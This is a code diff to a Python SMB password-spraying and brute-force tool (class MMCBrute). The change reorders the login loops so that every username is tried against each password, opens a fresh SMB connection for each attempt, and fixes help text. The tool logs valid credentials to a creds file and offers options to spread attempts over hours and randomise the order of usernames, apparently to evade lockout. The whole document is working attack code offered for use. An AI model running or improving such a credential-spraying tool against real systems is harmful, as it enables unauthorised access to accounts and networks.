@@ -131,40 +131,29 @@ class MMCBrute(object):
 		for target in self.targets:
 			target = target.strip()
 			self.target = target
-			smb_connection = SMBConnection(self.target, self.target)
 
 			username_list = [user.strip() for user in self.usernames]
 			if self.randomize:
 				random.shuffle(username_list)
 
-			for user in username_list:
-				if self.user_as_pass:
-					if self.duration and self.count > 0:
-						time.sleep(self.delay_between_attempts)
-					self.update_progress()
-					next_user = self.login(self.target, self.domain, user, user, smb_connection)
-					if next_user:
-						# Restablish smb_connection to avoid false positves
-						smb_connection.close()
-						smb_connection = SMBConnection(self.target, self.target)
-						continue
-				if self.passwords:
-					self.passwords.seek(os.SEEK_SET)
-					for password in enumerate(self.passwords):
-						password = password[-1].strip()
+			# Password attempts - go through all users for each password
+			if self.passwords:
+				self.passwords.seek(os.SEEK_SET)
+				password_list = [password.strip() for password in self.passwords]
+
+				for password in password_list:
+					for user in username_list:
 						if self.duration and self.count > 0:
 							time.sleep(self.delay_between_attempts)
 						self.update_progress()
-						next_user = self.login(self.target, self.domain, user, password, smb_connection)
-						if next_user:
-							# Restablish smb_connection to avoid false positves
-							smb_connection.close()
-							smb_connection = SMBConnection(self.target, self.target)
-							break
+						self.login(self.target, self.domain, user, password)
 
-	def login(self, target, domain, username, password, smb_connection):
+	def login(self, target, domain, username, password):
 		attempt = f"{domain}/{username}:{password}"
+		smb_connection = None
 		try:
+			# Create a fresh SMB connection for each login attempt
+			smb_connection = SMBConnection(target, target)
 			# This line will always raise an exception unless the credentials can initiate an smb connection
 			smb_connection.login(username, password, domain)
 			self.logger.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m")
@@ -214,6 +203,14 @@ class MMCBrute(object):
 				self.logger.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m")
 			return True
 
+		finally:
+			# Ensure connection is always closed
+			if smb_connection:
+				try:
+					smb_connection.close()
+				except:
+					pass
+
 	def end(self):
 		print() # (Cleans up output and log)
 		self.logger.info(f"\033[93mFinished at:\t\t{get_timestamp()}\033[0m")
@@ -255,7 +252,7 @@ if __name__ == '__main__':
 	group.add_argument('-c', '--creds', action='store', dest='output_creds', default='./logs/creds.log', help='Path to output creds file')
 	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
 	group.add_argument('--duration', action='store', type=float, dest='duration', help='Duration in hours to spread out spray attempts')
-	group.add_argument('--randomize', action='store_true', dest='randomize', help='Randomize the order of usernames from the -U list')
+	group.add_argument('--randomize', action='store_true', dest='randomize', help='Randomize the order of usernames from the -u list')
 	options = parser.parse_args()
 	output_log = options.output_log
 	output_creds = options.output_creds
